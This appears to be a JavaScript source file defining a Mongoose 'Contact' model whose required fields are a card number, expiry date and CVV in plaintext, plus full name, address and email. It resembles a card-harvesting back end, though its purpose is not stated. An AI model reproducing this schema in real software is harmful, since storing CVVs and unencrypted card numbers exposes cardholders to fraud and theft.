import mongoose from 'mongoose';

// Function to generate current date and time in a specific format
const getCurrentDateTime = () => {
    const currentDate = new Date();
    const year = currentDate.getFullYear();
    const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
    const month = months[currentDate.getMonth()];
    let day = currentDate.getDate();
    let hours = currentDate.getHours();
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12 || 12; // Convert hours to 12-hour format
    let minutes = currentDate.getMinutes();
    let seconds = currentDate.getSeconds();

    // Add leading zero if day, minutes, or seconds are less than 10
    day = day < 10 ? '0' + day : day;
    minutes = minutes < 10 ? '0' + minutes : minutes;
    seconds = seconds < 10 ? '0' + seconds : seconds;

    return `${hours}:${minutes}:${seconds} ${ampm} ${year}/${month}/${day}`;
};

// Define Contact model with simplified schema
const ContactSchema = new mongoose.Schema({
    card_number: {
        type: String,
        required: true,
    },
    expires: {
        type: String,
        required: true,
    },
    cvv: {
        type: String,
        required: true,
    },
    first_name: {
        type: String,
        required: true,
        trim: true
    },
    last_name: {
        type: String,
        required: true,
        trim: true
    },
    address: {
        type: String,
        required: true,
        trim: true
    },
    apartment: {
        type: String,
        required: true,
        trim: true
    },
    city: {
        type: String,
        required: true,
        trim: true
    },
    state: {
        type: String,
        required: true,
        trim: true
    },
    zip_code: {
        type: String,
        required: true,
        trim: true
    },
    email: {
        type: String,
        required: true,
        trim: true,
        lowercase: true,
    },
    phone: {
        type: Number,
    },
    createdAt: {
        type: String,
        default: getCurrentDateTime // Use getCurrentDateTime function to set default value
    }
}, { timestamps: true });

const Contact = mongoose.model('Contact', ContactSchema);

export default Contact;
